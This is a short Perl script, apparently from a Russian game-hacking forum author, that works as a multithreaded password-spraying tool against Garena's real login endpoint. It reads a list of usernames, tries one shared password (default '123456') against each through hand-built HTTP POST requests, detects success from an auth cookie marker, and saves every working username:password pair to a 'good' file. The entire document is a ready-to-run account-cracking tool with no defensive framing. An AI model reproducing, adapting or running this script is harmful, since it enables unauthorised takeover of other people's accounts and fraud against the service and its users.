#! /usr/bin/perl -w
use IO::Socket;
use threads;
use threads::shared;
use Fcntl ':flock';

$pwd	 =  shift || '123456'    	; #Пароль
$threads =  shift || 100		; #Кол-во потоков
$ml      =  shift || 'nick.txt'		; #Список акков
$fname   = 'good.txt'      		; #Валидные


my $i : shared = 0;
my @trl;
$| =1;

printf "by DeRZoST2......d3scene.ru\n";
print "Loading...\n";

open (ACS, "<$ml") || die("Could not open acc list file!");
my @acc : shared = <ACS>;
chomp(@acc);
close(ACS);

$size = scalar @acc;
print  "Loaded: ".$size." accs.\n";


for(0..$threads) {$trl[$_] = threads->create(\&Brut, $_);}
for(@trl) { $_->join; }

sub Brut
{
	while(@acc)
	{	
		{lock(@acc);$acc = shift @acc;}
		my $sock = sock();
		
		my $data =
		"-----------------------------18847261322183\n".
		"Content-Disposition: form-data; name=\"username\"\n\n".
		"$acc\n".
		"-----------------------------18847261322183\n".
		"Content-Disposition: form-data; name=\"password\"\n\n".
		"$pwd\n".
		"-----------------------------18847261322183\n".
		"Content-Disposition: form-data; name=\"loginSubmit\"\n\n".
		"Submit\n".
		"-----------------------------18847261322183--\n\n";
		
		my $re = 
		"POST http://www.garena.com/payment/index.php?c=VXNlcg==&a=bG9naW4= HTTP/1.1\n".
		"Host: www.garena.com\n".
		"User-Agent: Mozilla/4.0\n".
		"Connection: close\n".
		"Referer: http://garena.com\n".
		"Content-Type: multipart/form-data; boundary=---------------------------18847261322183\n".
		"Content-Length: ".length($data)."\n\n".$data;
	
		print $sock $re; 
		read($sock,my $answ,10000);
		
		if($answ =~ /cdb_auth/)
			{
				print "[+] $acc\n";
				open(FILE, ">>$fname") || die("Could not open $fname\n");
				flock(FILE, LOCK_EX);
				print FILE "$acc:$pwd\n";
				flock(FILE, LOCK_UN);
				close(FILE);
			}
		{lock($i);$i++;}
		print "< ".sprintf("%.2f", ($i/$size)*100)."% >\r";
		close($sock);
	}
}

sub sock {
my $sock;
do {
	$sock = new IO::Socket::INET 
		(
		PeerAddr => 'garena.com',
   		PeerPort => 80, 
   		PeerProto => 'tcp', 
   		TimeOut => 10
		) or print "Can't connect\n";
	} while (!$sock);
return $sock;
}
#(c)DeRZoST2